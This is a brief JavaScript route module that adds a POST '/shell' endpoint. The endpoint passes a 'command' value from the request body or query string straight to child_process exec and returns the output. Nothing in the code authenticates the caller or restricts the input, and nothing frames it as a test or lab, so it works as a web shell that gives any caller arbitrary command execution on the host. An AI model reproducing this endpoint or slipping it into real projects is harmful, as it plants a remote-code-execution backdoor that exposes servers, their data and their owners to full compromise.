import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

export default function (app) {
  app.post('/shell', async (req, res) => {
    try {
      const shellCmd = req.body.command ?? req.query.command ?? '';

      const { stdout } = await execAsync(shellCmd);

      res.json({ message: stdout.trim() });
    } catch (err) {
      res.json({ error: `Failed to execute cmd: ${err.message}` });
    }
  });
}